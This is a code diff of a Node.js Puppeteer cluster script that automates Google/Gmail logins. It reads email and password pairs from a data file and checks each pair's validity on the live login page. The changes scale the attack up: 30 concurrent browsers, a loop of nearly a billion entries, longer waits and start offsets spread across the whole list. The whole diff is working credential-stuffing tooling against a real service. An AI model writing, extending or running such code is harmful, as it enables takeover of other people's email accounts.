@@ -10,20 +10,32 @@ const  {exec} = require('child_process')
 process.setMaxListeners(0);
 
 //Check Data File
-var myF = new JFile("./data.txt");
+const  myF = new JFile("./data.txt");
 
+
+function getRandomNumberInRange(min, max, count) {
+  const gap = Math.floor((max - min) / (count - 1));
+  const equallySpacedIntegers = [];
+
+  for (let i = 0; i < count; i++) {
+    const number = min + i * gap;
+    equallySpacedIntegers.push(number);
+  }
+
+  return equallySpacedIntegers;
+}
 
 //Swap front character to uppecase
 function capitalizeWords(arr) {
   return arr.map(element => {
-    return element.charAt(0).toUpperCase() + element.slice(1).replace(/\r/g, "");
+    return element.charAt(0).toUpperCase() + element.slice(1).replace(/\r/g, "@");
   });
 }
 
 //Swap front character to lowercase
 function decapitalizeWords(arr) {
   return arr.map(element => {
-    return element.charAt(0).toLowerCase() + element.slice(1).replace(/\r/g, "");
+    return element.charAt(0).toLowerCase() + element.slice(1).replace(/\r/g, "@");
   });
 }
 
@@ -36,7 +48,7 @@ function checkUpper(string) {
   //Initialize puppeteer
   const cluster = await Cluster.launch({
     concurrency: Cluster.CONCURRENCY_BROWSER,
-    maxConcurrency: 8,
+    maxConcurrency: 30,
   });
 
 
@@ -52,15 +64,18 @@ function checkUpper(string) {
       ]
     });
 
+    await new Promise(r => setTimeout(r, 10000));
+
     const loginUrl = "https://accounts.google.com/AccountChooser?service=mail&continue=https://google.com&hl=en";
     const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36';
     const page = await browser.newPage();
     await page.setUserAgent(ua);
     await page.goto(loginUrl, { waitUntil: 'networkidle2' });
 
+    await new Promise(r => setTimeout(r, 10000));
 
   //Loop through data
-  for (let i = start; i < start + 9000; i++) {
+  for (let i = start; i < start + 900000000; i++) {
     try {
 
       //Search for email box in gmail login page
@@ -70,7 +85,7 @@ function checkUpper(string) {
       await page.keyboard.press('Enter');
 
       //Timeout for loading transition between email page and password page
-      await page.waitForTimeout(3000);
+      await page.waitForTimeout(8000);
 
       //Check whether the email is valid or not
       const error = await page.evaluate((strings) => {
@@ -93,7 +108,7 @@ function checkUpper(string) {
       await page.keyboard.press('Enter');
 
       //Timeout for loading transition between email page and password page (Adjust this duration based on your internet speed)
-      await page.waitForTimeout(3000);
+      await page.waitForTimeout(8000);
 
       //Check whether the password is correct or not
       const matches = await page.evaluate((strings) => {
@@ -117,7 +132,6 @@ function checkUpper(string) {
       continue
 
     } catch (error) {
-      console.log(1 + i + ": Yay, You're Straight!")
       await page.goto(loginUrl, { waitUntil: 'networkidle2' });
       continue;
 
@@ -126,14 +140,11 @@ function checkUpper(string) {
   });
 
   
+  const randommnumbers = (getRandomNumberInRange(1,(myF.lines).length,22))
+  randommnumbers.shift();
+  randommnumbers.pop();
+  randommnumbers.map((number) => { cluster.queue(number) })
 
-  cluster.queue(208800);
-  cluster.queue(107241);
-  cluster.queue(88224);
-  cluster.queue(220026);
-  cluster.queue(166260);
-  cluster.queue(186681);
-  cluster.queue(175005);
 
   await cluster.idle();
   await cluster.close();
